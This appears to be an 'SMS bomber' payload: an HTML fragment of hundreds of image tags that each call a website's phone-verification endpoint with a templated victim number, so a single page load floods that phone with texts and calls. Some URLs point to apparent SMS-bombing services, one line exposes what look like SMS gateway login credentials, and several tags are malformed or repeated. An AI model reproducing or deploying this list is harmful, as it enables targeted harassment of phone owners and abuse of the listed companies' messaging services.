<img src='https://www.yongche.com/ajax/send_verify_code.php?cellphone=$phone' alt=''/>
<img src='http://www.atmyjr.com/user/ashx/ajax.ashxaction=telyuyin&mid=17433&v=1438962406156&txtMobile=$phone' alt=''/>
<img src='http://www.ezhe.com/api/verifyCode?phone=$phone&type=2&smsType=1' alt=''/>
<img src='http://www.rrjc.com/sendVoiceCodeByType.do?username=$phone' alt=''/>
<img src='http://www.line0.com/usercenter/voiceVerificationCodeUserLogin.do?mobile=$phone' alt=''/>
<img src='http://www.91zcp.com/reg/getVoiceCode？phone=$phone' alt=''/>
<img src='http://www.puyitou.com/service.html?SERVERID=770010&BIZ_CODE=REG_PHONE_CODE&PHONE_NUM=$phone&SEND_TYPE=2' alt=''/>
<img src='http://www.puyitou.com/service.html?SERVERID=770010&BIZ_CODE=REG_PHONE_CODE&PHONE_NUM=$phone&SEND_TYPE=2' alt=''/>
<img src='http://www.line0.com/usercenter/voiceVerificationCodeUserLogin.do?mobile=$phone&voiceType=login' alt=''/>
<img src='https://www5.rayvision.com/yxzCode!send.action?type=2&toPhone=$phone' alt=''/>
<img src='https://sso.jrj.com.cn/sso/ajaxSendVoice?mobile=$phone' alt=''/>
<img src='http://www.rrjc.com/sendVoiceCodeByType.do?username=$phone&regType=1&v_module=toNoviceRegistered' alt=''/>
<img src='http://haojue78.com/WS/WSAccount.asmx/SendMobileMsg?mobile=$phone' alt=''/>
<img src='https://www.xintongdai.com/customer/login/register/acquirePhoneAgreeItem?phone=$phone' alt=''/>
<img src='http://www.hotouzi.com/register/register_sms.html?telephone=$phone&token=' alt=''/>
<img src='http://my.baihe.com/Getinterregist/getPhoneVerifyCode?jsonCallBack=jQuery18306001467584540825_1439706800918&type=2&phone=$phone&_=1439707017074' alt=''/> 
<img src='http://u.panda.tv/ajax_send_sms?_jp=jQuery112408335659883577431_1478711837703&regionId=86&mobile=$phone' alt=''/>
<img src='http://passport.aplus.pptv.com/2015usercenter/api/sendphonecode/?phoneNum=$phone' alt=''/>
<img src='http://zhg.zhuyousoft.com/index.php?s=/Sms/sendSms&phone=$phone' alt=''/>
<img src='http://ser.syccy.com/PhoneApi/NewSendMemberCodeForSMS?Phone=$phone' alt=''/>
<img src='http://www.chaojitao.cn/index.php?act=login&op=send_reg_sms&f=reg&mobile=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://ruzhu.jd.com/user/sendVC?phone=$phone' alt=''/>
<img src='http://edms.fcbox.com/hibox/weixin/getVerifyCode?mobilePhone=$phone' alt=''/>
<img src='http://api.zhuangdianbi.com/api/sendSms?phone=$phone' alt=''/>
<img src='http://www.dingapp.com/sendUserValidCode.action?mobile=$phone' alt=''/>
<img src='http://www.hcoriental.com/api/v1/user/auth_code/?phone=$phone' alt=''/>
<img src='http://www.patfun.com/do.php?ac=check_sms&phone=$phone' alt=''/>
<img src='http://i.pptv.com/2015usercenter/api/sendphonecode/?phoneNum=$phone' alt=''/>
<img src='https://www.xiongmaojinfu.com//user/index/sendSms?mobile=$phone' alt=''/>
<img src='http://www.variflight.com/login/reg/sendSms?AE71649A58c77&phone=$phone' alt=''/>
<img src='http://m.bidcenter.com.cn/JsonHandler/QuickRegisterValidateCode.aspx?mobiles=$phone' alt=''/>
<img src='http://ws.sythealth.com/wsbyte/fit/v4/sms/validatorcode?form=0&account=$phone' alt=''/>
<img src='http://m.bidcenter.com.cn/JsonHandler/QuickRegisterValidateCode.aspx?mobiles=$phone' alt=''/>
<img src='http://user.memeyule.com/authcode/send_mobile?mobile=$phone' alt=''/>
<img src='http://m.51awifi.com/msv2/sms/send?callback=jQuery111307387434379197657_1489515690497&mobile=$phone' alt=''/>
<img src='http://ld.liandan100.com/ldmgr/api/user/sendVerifySms?platform=1&versionNum=53&&r=&partnerId=$phone' alt=''/>
<img src='http://www.jiedianqian.com/api/account/send_verify_code.do?mobile=$phone' alt=''/>
<img src='http://m.yaya.cn/tools/web_submit.ashx?action=reg_get_mobile_code&mobile=$phone' alt=''/>
<img src='http://www.zhichiwangluo.com/index.php?r=Login/phoneResetCode&phone=$phone' alt=''/>
<img src='https://api.daishangqian.com/v2/user/send-sms-code?phone=$phone' alt=''/>
<img src='http://www.98xianyou.com/passport/sign/code.html?mobile=$phone' alt=''/>
<img src='http://xq.ibaihe.com/register/captcha?phone=$phone' alt=''/>
<img src='http://member.ehaier.com/sendMobileSmsVerify.html?mobile=$phone' alt=''/>
<img src='https://www.jdpay.com/login/register/sendActiveCode.htm?tel=$phone' alt=''/>
<img src='http://app.bczp.cn/pk/GetCode.ashx?mobile=$phone' alt=''/>
<img src='http://daogou.zdl123.com/daogou/webService?mobile=$phone' alt=''/>
<img src='http://wifi.gd118114.cn/getPassword.ajax?username=$phone' alt=''/>
<img src='http://www.wsngo.com/reg/sendSmsCheck.html?phone=$phone' alt=''/>
<img src='http://www.yingegou.cn//api/v2/user/getSmsCode.do?mobile=$phone' alt=''/>
<img src='http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp=$phone' alt=''/>
<img src='http://spi.lakala.com/wechat/weixin/signUp/getSMSCode.do?Mobile=$phone' alt=''/>
<img src='http://tel.kuaishang.cn/cl.php?tel=$phone' alt=''/>
<img src='http://www.weloan.com/front/account/verifyMobile?mobile=$phone' alt=''/>
<img src='http://passport.fanli.com/mobileapi/i/user/mobileFastReg?deviceno=860903034476055&mobile=$phone' alt=''/>
<img src='http://vis3.renwuto.com/VerifyCode/SendReg?tk=$phone' alt=''/>
<img src='http://biz.sandnes.cn/msgapi.php?phone=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://api.yinka.co/common/sms?cellphone=$phone' alt=''/>
<img src='http://wap.10010.com/mobileService/tuiguang/sendMsg.htm?mobileNumber=$phone' alt=''/>
<img src='http://api.nfapp.southcn.com/nanfang_if/getVerifiCode?phoneNo=$phone' alt=''/>
<img src='http://www.v5kf.com/member/index/ajax_get_sms_code?mobile=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='https://www.sxcfu.com/user/verifyPhone?phone=$phone' alt=''/>
<img src='http://www.cmpassport.com/openapi/sendDynaPwd?account=$phone' alt=''/>
<img src='http://api.66yxq.com:8075/gateway-web/send.htm?mobile=$phone' alt=''/>
<img src='http://www.loho88.com/activ_check_mobile.php?activ_id=67&activ_type=mis&part_id=body_1_4&goods_id=100&is_new_customers_allow=0&phone=$phone' alt=''/>
<img src='http://api.jb669.com:9000/jinbang/login/verifyPhone.do?phoneCode=$phone' alt=''/>
<img src='http://118.178.230.82:8081/front/smsLogin.do?sign=2688a8ff469c6a19aeff8c70cfd5444e&platformCode=HUIYING&stime=1483258437244&token=35228404066186&smsType=LOGIN_VERIFY&cell=$phone' alt=''/>
<img src='https://m.ule.com/user/getRegValidateCode?mobile=$phone' alt=''/>
<img src='http://ser.syccy.com/PhoneApi/NewSendMemberCodeForSMS?Phone=$phone' alt=''/>
<img src='http://mobile.rrjc.com/mobile/service.do?operate=2&VersionValue=V2.3.2&vc=29&paramMap.hardwareDpi=1280x720&paramMap.androidBrand=Android&paramMap.hardwareVersion=NoxW&paramMap.systemVersion=4.4.2&type_method=IDX_SENDCODENOLOGIN&appLineNumber=20161123132705&userAppId=f4b7d231-42d5-4220-880a-21223a874c2b&signRrjcMsg=03fb3195732bf4b53cbfe65c342d3980&paramMap.cellphone=$phone' alt=''/>
<img src='http://db.3z.cc/index.php?tp=front/reg&appid=0&pt=1&ver=2.2.4&imei=352286900745893&sign=c225f84dad88d1c3521fb0ec39e77d5c&op=verify&phone=$phone' alt=''/>
<img src='http://wx.imlaidian.com/testapi/authCodeGet?callback=jQuery1113009964326163753867_1483628589051&mobile=$phone' alt=''/>
<img src='http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp=$phone' alt=''/>
<img src='http://passport.1yyg.com/JPData?action=send2Msg&userMobile=$phone' alt=''/>
<img src='http://www.weloan.com/front/account/verifyMobile?mobile=$phone' alt=''/>
<img src='http://user.memeyule.com/authcode/send_mobile?china=true&mobile=$phone' alt=''/>
<img src='http://passport.fanli.com/mobileapi/i/user/mobileFastReg?deviceno=860903034476055&mobile=$phone' alt=''/>
<img src='http://vis3.renwuto.com/VerifyCode/SendReg?tk=$phone' alt=''/>
<img src='http://biz.sandnes.cn/msgapi.php?phone=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://w4.duoyi.com/p_user/DoNewActCards.aspx?gate=sw&jsoncallback=jQuery18303232165043277003_1483854401800&act=getsmscode&phone=$phone' alt=''/>
<img src='http://221.179.180.158:9008/HttpQuickProcess/submitMessageAll?OperID=zjawu&OperPass=AqBTaIWp&DesMobile=$phone' alt=''/>
<img src='http://sms.maogoo.cn/index.php?hm=$phone' alt=''/>
<img src='http://zha.vvoso.com/?zha=$phone&x=10' alt=''/>
<img src='http://www.zsbox.net/api/call/index?user_id=244127&auth_key=c602e6ebb2311895b922d5bef854dc87&type=c&proxy_id=148455&phones=$phone' alt=''/>
<img src='http://511xy.pw/?hone=$phone&s=3&admin=666&' alt=''/>
<img src='http://www.zsbox.net/api/call/index?user_id=244127&auth_key=c602e6ebb2311895b922d5bef854dc87&type=c&proxy_id=148455&phones=$phone' alt=''/>
<img src='http://gd.10086.cn/easy/product/order/getValidateRndCode.jsps?commCode=LLKC300&merchantCode=GD&mobile=$phone' alt=''/>
<img src='http://511xy.pw/?hone=$phone&s=1&admin=666' alt=''/>
<img src='http://www.zsbox.net/api/call/index?user_id=244127&auth_key=c602e6ebb2311895b922d5bef854dc87&type=c&proxy_id=148455&phones=$phone' alt=''/>
<img src='http://m.shanzhen.me/sz/index/smsverifyp?phone=$phone' alt=''/>
<img src='http://home.ecook.cn/user/getVerifyCode?phone=$phone' alt=''/>
<img src='http://www.v5kf.com/member/index/ajax_get_sms_code?mobile=$phone' alt=''/>
<img src='http://passport.fang.com/loginsendmsm.api?MobilePhone=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='https://www.sxcfu.com/user/verifyPhone?phone=$phone' alt=''/>
<img src='http://www.cmpassport.com/openapi/sendDynaPwd?account=$phone' alt=''/>
<img src='https://m.ule.com/user/getRegValidateCode?mobile=$phone' alt=''/>
<img src='https://uac.10010.com/oauth2/OpSms?callback=jsonp1490030472329&req_time=1490030480322&user_id=$phone' alt=''/>
<img src='http://www.weloan.com/front/account/verifyMobile?mobile=$phone' alt=''/>
<img src='http://user.memeyule.com/authcode/send_mobile?china=true&mobile=$phone' alt=''/>
<img src='http://passport.fanli.com/mobileapi/i/user/mobileFastReg?deviceno=860903034476055&mobile=$phone' alt=''/>
<img src='http://vis3.renwuto.com/VerifyCode/SendReg?tk=$phone' alt=''/>
<img src='http://biz.sandnes.cn/msgapi.php?phone=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://home.ecook.cn/user/code?phone=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='http://ser.syccy.com/PhoneApi/NewSendMemberCodeForSMS?Phone=$phone' alt=''/>
<img src='http://www.weloan.com/front/account/verifyMobile?mobile=$phone' alt=''/>
<img src='http://passport.fanli.com/mobileapi/i/user/mobileFastReg?deviceno=860903034476055&mobile=$phone' alt=''/>
<img src='http://m.shanzhen.me/sz/index/smsverifyp?phone=$phone' alt=''/>
<img src='http://www.cmpassport.com/openapi/sendDynaPwd?account=$phone' alt=''/>
<img src='http://m.fanli.com/invite/sendverifycode?jsoncallback=jsonp2&pos=601&t=1488608297799&mobile=$phone' alt=''/>   <img src='http://bj1.xiangcloud.com.cn/customer/sms/?phone=$phone &accessType=1&circleId=100000055' alt=''/> 
<img src='http://wifi.gd118114.cn/getPassword.ajax?username=$phone&os=h5&_srcid=10000386' alt=''/>
<img src='http://www.upshop.cn/Home/User/registerSendCode.html?mobile=$phone' alt=''/> <img src='http://www.kl.cc/User/RegSendMobilMail?t=$phone' alt=''/>
 <img src='http://www.xjggjy.com/platform/service/users/register/sendMessage?mobile=$phone' alt=''/> <img src='http://www.mgff.com/passport/send_mobile_yzm?mobile=$phone' alt=''/><img src='http://member.med66.com/uc/smscode?phone=$phone' alt=''/>
 <img src='http://passport3.pcgames.com.cn/passport3/api/sendVerificationCode.jsp?mobile=  $phone' alt=''/><img src='http://hy.hryouxi.com/HRPF/website/sendSMS.do?phone=$phone' alt=''/> <img src='https://www.4008123123.com/phhs_ios/isNotExistUser.action?r=0.9460999953115119?phone=$phone' alt=''/>  <img src='http://www.hongzhoukan.com/ajax/check_tel_reg.php?mobile=$phone' alt=''/> 
<img src='http://sso1.nlc.cn/sso/currency/sendCodeToMobile?mobile=$phone' alt=''/> 
 <img src='http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=$phone' alt=''/>
 <img src='http://www.wandafilm.com/login.do?m=sendSms?mobile=$phone' alt=''/>
   <img src='http://www.daquant.com/Member/Index/sendcodes?mobile=$phone' alt=''/> 
<img src='http://www.ind4.net/pc/member/sendRegisterSms.do?phoneNumber=$phone &_=1502021540432' alt=''/> <img src='http://www.12chu.com/reg/sendCode.jhtml?mobile=$phone' alt=''/> 
<img src='http://cuckooshop.cn/SMS?phone=$phone' alt=''/>
<img src='http://www.chatm.com/userInfo/smsCode?mobilephone=$phone' alt=''/>
<img src='http://www.nswtt.org.cn/commonSms/send.do?mobile= $phone' alt=''/> 
 <img src='http://www.4008123123.com/phhs_ios/sendSmsCodeVip.action &accessType=1&circleId=100000055 username=$phone' alt=''/>
<img src='http://www.jsvideo.tv/sendMsg&type=1 mobile=$phone' alt=''/> 
 <img src='http://www.wish3d.com/chitAppValidate.action id=$phone' alt=''/>
<img src='http://www.12366.com/front/userInfo/sendRegisterMessage loginName=$phone' alt=''/>
 <img src='http://www.qdnks.com/default/user/getvlcode &purpose=register act=get_verify&user_name=$phone' alt=''/>
 <img src='http://app.doowinedu.com/Api/register.php &accountLogin.loginName= accountLogin.mobile=$phone' alt=''/>
<img src='http://jzplatform.com/distributor/sendcode_do.php e.account=$phone' alt=''/>
<img src='http://www.wjask.com/wj/req_phone_code  &tem=register Mobile=$phone' alt=''/>
<img src='http://www.eshiptrading.com.cn/api/SMSSafeCode?mobile=$phone' alt=''/>
<img src='http://www.hzrc.com/ww/b/a/wwba_sendMobileCode.html?phone= $phone' alt=''/><img src='https://login.zbj.com/register/sendRegisterCode?sacc= $phone' alt=''/><img src='http://www.zoneidc.com/user/sendmobi.asp?mobi=  $phone' alt=''/><img src='http://passport.ctrl.cn/sms/reg?mobile=$phone' alt=''/>
<img src='http://www.passpay.net/login/sendVerifyCode?mobile=$phone' alt=''/>  <img src='http://www.longone.com.cn/servlet/user/Register?&function=AjaxGetPin1&mo= $phone' alt=''/><img src='http://passport.csdn.net/account/mobileregister?action=sendMobileCode&mobile=$phone' alt=''/>  <img src='http://i.kuwo.cn/US/2014/api/send_sms.jsp?mobile=  $phone' alt=''/><img src='http://wap.yunxin123.com/index/getregcode/bid/yunxin?mobile=$phone' alt=''/>
 <img src='http://center.siyi.cn/process.aspx?c=sendvcode&vt=sms&va=reg&mobile=$phone' alt=''/> <img src='http://www.023jz.com/register/sendMobileCode.html?mobile=$phone' alt=''/> <img src='https://login.10086.cn/chkNumberAction.action?userName=$phone' alt=''/>   <img src='http://forum.xitek.com/forum.php?mod=ajax&infloat=register&handlekey=register&action=vcode&inajax=1&fp=4155208328&check=80e5&mobile= $phone' alt=''/><img src='https://www.4008123123.com/phhs_ios/isNotExistUser.action?r=0.4572958659946349?phone=  $phone' alt=''/><img src='http://api.hiwemeet.com/register/auth_code?phone=$phone' alt=''/>
<img src='http://wsdj.baic.gov.cn/common/sms/vercode/send.do?mobile=$phone' alt=''/>
	<img src='http://www.nacao.org.cn/eportal/ui?moduleId=692a74d178a7426180fa08f4b5531330&struts.portlet.action=/portlet/yzm!sendMsg.action&telPhone=$phone&yzm=H137' alt=''/>
	<img src='https://passport.haochedai.com/UserForDeayou/phoneCode?callbackparam=jsonpReturn&phone=$phone' alt=''/>
<img src='http://ffp.airchina.com.cn/app/generateSmscode?phoneNum=$phone&t=0.5165145328970137' alt=''/>
 <img src='http://passport2.chaoxing.com/num/phonecode?phone=http://s.juntu.com/member/index/getLoginCode?mobile=$phone' alt=''/>
<img src='http://www.ksdao.com/sendMsgCode?mobile=$phone' alt=''/>
<img src='http://m.tk.cn/tkmobile/service/member?function_code=dynamicLogin&login_mobile=$phone' alt=''/>
<img src='http://www.songhebao.com/serv/api/member/GetSMSCode.ashx?phone=$phone$phone&lx=1' alt=''/>
<img src='http://passport.kuaichecaifu.com/UserForDeayou/phoneCode?callbackparam=jsonpReturn&phone=$phone'&agent=9&_=1500773935216' alt=''/>
<img src='http://www.yijiej.com/user/getVerifyCode?phone=$phone' alt=''/>
<img src='http://m.yuhuijob.com/skins/save_check.php?f=regyzm&uname=$phone' alt=''/>
<img src='http://m.ikuyu.cn/login/getvcode？phone=$phone' alt=''/>
<img src='http://passport.aplus.pptv.com/2015usercenter/api/sendphonecode/?phoneNum=$phone' alt=''/>
<img src='http://www.yingegou.cn//api/v2/user/getSmsCode.do?mobile=$phone' alt=''/>
<img src='http://spi.lakala.com/wechat/weixin/signUp/getSMSCode.do?Mobile=$phone' alt=''/>
<img src='http://user.memeyule.com/authcode/send_mobile?china=true&mobile=$phone' alt=''/>
<img src='http://w4.duoyi.com/p_user/DoNewActCards.aspx?gate=sw&jsoncallback=jQuery18303232165043277003_1483854401800&act=getsmscode&phone=$phone' alt=''/>
<img src='http://api.yinka.co/common/sms?cellphone=$phone' alt=''/>
<img src='http://www.v5kf.com/member/index/ajax_sms_code?mobile=$phone' alt=''/>
<img src='http://api.juewei.com//api/Verify/sendSms?_=$phone' alt=''/>
http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='http://m.cibyun.com/User/SendRegistCCP?MemberUserId=-1&SellerUserId=null&X-Requested-By=m.cibyun.com&X-Requested-Data=qmjpyeprwskgcihxbbx&phone=$phone' alt=''/>
<img src='http://www.wenbita.net/plugin.php?id=wq_smslogin&mod=sendcode&handlekey=bind&loginsubmit=yes&module=register&phone=$phone' alt=''/>
<img src='http://api.nfapp.southcn.com/nanfang_if/getVerifiCode?phoneNo=$phone' alt=''/>
<img src='http://www.yingegou.cn//api/v2/user/getSmsCode.do?mobile=$phone' alt=''/>
<img src='http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://api.nfapp.southcn.com/nanfang_if/getVerifiCode?phoneNo=$phone' alt=''/>
<img src='http://sso.toutiao.com/send_activation_code/?mobile=$phone' alt=''/>
<img src='http://tools.wx6.org/duanxinhongzhaji/?telcode=$phone' alt=''/>
<img src='http://zhg.zhuyousoft.com/index.php?s=/Sms/sendSms&phone=$phone' alt=''/>
<img src='http://ser.syccy.com/PhoneApi/NewSendMemberCodeForSMS?Phone=$phone' alt=''/>
<img src='http://bbs.fqlook.cn/plugin.php?id=dzapp_mobile&mod=ajax&ac=code&type=reg&inajax=1&formhash=7290e7db&mobile=$phone' alt=''/>
<img src='http://db.3z.cc/index.php?tp=front/reg&appid=0&pt=1&ver=2.2.4&imei=352286900745893&sign=c225f84dad88d1c3521fb0ec39e77d5c&op=verify&phone=$phone' alt=''/>
<img src='http://www.yingegou.cn//api/v2/user/getSmsCode.do?mobile=$phone' alt=''/>
<img src='http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp=$phone' alt=''/>
<img src='http://spi.lakala.com/wechat/weixin/signUp/getSMSCode.do?Mobile=$phone' alt=''/>
<img src='http://tel.kuaishang.cn/cl.php?tel=$phone' alt=''/>
<img src='http://passport.1yyg.com/JPData?action=send2Msg&userMobile=$phone' alt=''/>
<img src='http://www.52tanbao.com/tanbao-app-api/SendValidCode?telephone=$phone' alt=''/>
<img src='http://www.weloan.com/front/account/verifyMobile?mobile=$phone' alt=''/>
<img src='http://user.memeyule.com/authcode/send_mobile?china=true&mobile=$phone' alt=''/>
<img src='http://passport.fanli.com/mobileapi/i/user/mobileFastReg?deviceno=860903034476055&mobile=$phone' alt=''/>
<img src='http://vis3.renwuto.com/VerifyCode/SendReg?tk=$phone' alt=''/>
<img src='http://biz.sandnes.cn/msgapi.php?phone=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://w4.duoyi.com/p_user/DoNewActCards.aspx?gate=sw&jsoncallback=jQuery18303232165043277003_1483854401800&act=getsmscode&phone=$phone' alt=''/>
<img src='http://api.yinka.co/common/sms?cellphone=$phone' alt=''/>
<img src='http://221.179.180.158:9008/<img src='httpQuickProcess/submitMessageAll?OperID=zjawu&OperPass=AqBTaIWp&DesMobile=$phone' alt=''/>
<img src='http://sms.maogoo.cn/index.php?hm=$phone' alt=''/>
<img src='http://m.cibyun.com/User/SendRegistCCP?MemberUserId=-1&SellerUserId=null&X-Requested-By=m.cibyun.com&X-Requested-Data=qmjpyeprwskgcihxbbx&phone=$phone' alt=''/>
<img src='https://www.xiaoying.com/user/apiCheckRegister?callback=jQuery19105981196630189294_1488300711819&mobile=$phone' alt=''/>
<img src='http://passport.aplus.pptv.com/2015usercenter/api/sendphonecode/?phoneNum=$phone' alt=''/>
<img src='http://zhg.zhuyousoft.com/index.php?s=/Sms/sendSms&phone=$phone' alt=''/>
<img src='http://api.juewei.com//api/Verify/sendSms?_=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp=$phone' alt=''/>
<img src='http://spi.lakala.com/wechat/weixin/signUp/getSMSCode.do?Mobile=$phone' alt=''/>
<img src='http://tel.kuaishang.cn/cl.php?tel=$phone' alt=''/>
<img src='http://passport.1yyg.com/JPData?action=send2Msg&userMobile=$phone' alt=''/>
<img src='http://www.52tanbao.com/tanbao-app-api/SendValidCode?telephone=$phone' alt=''/>
<img src='http://www.weloan.com/front/account/verifyMobile?mobile=$phone' alt=''/>
<img src='http://user.memeyule.com/authcode/send_mobile?china=true&mobile=$phone' alt=''/>
<img src='http://passport.fanli.com/mobileapi/i/user/mobileFastReg?deviceno=860903034476055&mobile=$phone' alt=''/>
<img src='http://vis3.renwuto.com/VerifyCode/SendReg?tk=$phone' alt=''/>
<img src='http://biz.sandnes.cn/msgapi.php?phone=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://w4.duoyi.com/p_user/DoNewActCards.aspx?gate=sw&jsoncallback=jQuery18303232165043277003_1483854401800&act=getsmscode&phone=$phone' alt=''/>
<img src='http://john.huainanhai.com/mobile/send_mobile_code_v2?phone_no=86-$phone' alt=''/>
<img src='http://passport.1yyg.com/JPData?action=send2Msg&userMobile=$phone' alt=''/>
<img src='http://passport.fanli.com/mobileapi/i/user/mobileFastReg?deviceno=860903034476055&mobile=$phone' alt=''/>
<img src='http://vis3.renwuto.com/VerifyCode/SendReg?tk=$phone' alt=''/>
<img src='http://gd.10086.cn/easy/product/order/getValidateRndCode.jsps?commCode=LLKC300&merchantCode=GD&mobile=$phone' alt=''/>
<img src='http://www.xjwvxz.com/api/call/index?user_id=244127&auth_key=c602e6ebb2311895b922d5bef854dc87&type=c&proxy_id=148455&phones=$phone' alt=''/>
<img src='http://www.zsbox.net/api/call/index?user_id=244127&auth_key=c602e6ebb2311895b922d5bef854dc87&type=c&proxy_id=148455&phones=$phone' alt=''/>
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$phone' alt=''/>
<img src='http://www.youmw.top/tool/dxhz/?hm=$phone&ok=' alt=''/>
<img src='http://zha.vvoso.com/honzhani.php?zha=$phone&x=100' alt=''/>
<img src='http://www.bjoil.com/bjoil/member/mobileVerify.action?tamp=1479798866609/bjoil/member/mobileVerify.action?tamp=1479798866609/bjoil/member/mobileVerify.action?tamp=1479798866609&mobile=$phone' alt=''/>
<img src='http://tools.wx6.org/duanxinhongzhaji/?telcode=$phone' alt=''/>
<img src='http://bsdt.jhga.gov.cn/egov/jhwas/jsp/info/checkmobile.jsp?mobile=$phone' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=0' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=8' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=7' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=6' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=5' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=4' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=3' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=2' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=1' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=9' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=10' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=11' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=12' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=13' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=14' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=15' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=16' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=17' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=18' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=19' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=20' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=21' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=22' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=23' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=24' alt=''/>
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$phone&type=25' alt=''/>
<img src='http://survey.dxy.cn/forms/public/survey2/captcha?sid=102998&itemid=127053&phone=$phone' alt=''/>
<img src='http://n.youyuan.com/v20/yuan/get_registerMobile_code.html?mobile=$phone&from=5599' alt=''/>
<img src='http://passport.chinahr.com/ajax/m/sendCode/$phone?tmpid=1957&from=2&imgCode=' alt=''/>
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$phone' alt=''/>
<img src='http://newweb.lumiai.com/api/isecurity/sms_captcha?mobile=$phone' alt=''/>
<img src='http://www.lxzbsjsm.com/auth/smscode.ashx?action=vd&aid=5813&mb=$phone&t=''/>
<img src='http://lvyou.baidu.com/business/api/orderforward?callback=jQuery182032357188081368804_1490544543748&source=lvyou&phone=$phone&qt=phone_captcha&sub_from=order_list&request_from=webapp&_=1490544543509' alt=''/>
<img src='http://reg.suning.com/srs-web/ajax/code/sms.do?scen=PERSON_MOBILE_REG_VERIFY_MOBILE&phoneNum=$phone&uid=&code=' alt=''/>
<img src='http://www.wsngo.com/reg/sendSmsCheck.html?phone=$phone' alt=''/>
<img src='http://www.iliangcang.com/i/mob_login?act=getCode&mobile=$phone' alt=''/>
<img src='http://m.nsyh001.com/user/ajax/Btnmobileverify?user_name=$phone' alt=''/>
<img src='http://ws.sythealth.com/wsbyte/fit/v4/sms/validatorcode?form=0&account=$phone' alt=''/>
<img src='http://passport.chinahr.com/ajax/m/sendCode/$phone?tmpid=773' alt=''/>
<img src='http://passport.chinahr.com/ajax/m/sendCode/$phone?tmpid=1957&from=2&imgCode=' alt=''/>
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$phone' alt=''/>
<img src='http://newweb.lumiai.com/api/isecurity/sms_captcha?mobile=$phone' alt=''/>
<img src='http://www.lxzbsjsm.com/auth/smscode.ashx?action=vd&aid=5813&mb=$phone&t=''/>
<img src='http://m.nsyh001.com/user/ajax/Btnmobileverify?user_name=$phone' alt=''/>
<img src='http://ws.sythealth.com/wsbyte/fit/v4/sms/validatorcode?form=0&account=$phone' alt=''/>
<img src='http://m.anjuke.com/general/sendphonecode?phone=$phone&captcha=' alt=''/>
<img src='http://www.e8088.com/index/product/try!phoneVerifyCode.action?tipMessage=$phone' alt=''/>
<img src='http://uniservice.kugou.com/v2/activity/sendCode?call_number=$phone&cb=kgJSONP239130071' alt=''/>
<img src='http://www.reedoun.com/os/user/getCode?mobile=$phone&type=1' alt=''/>
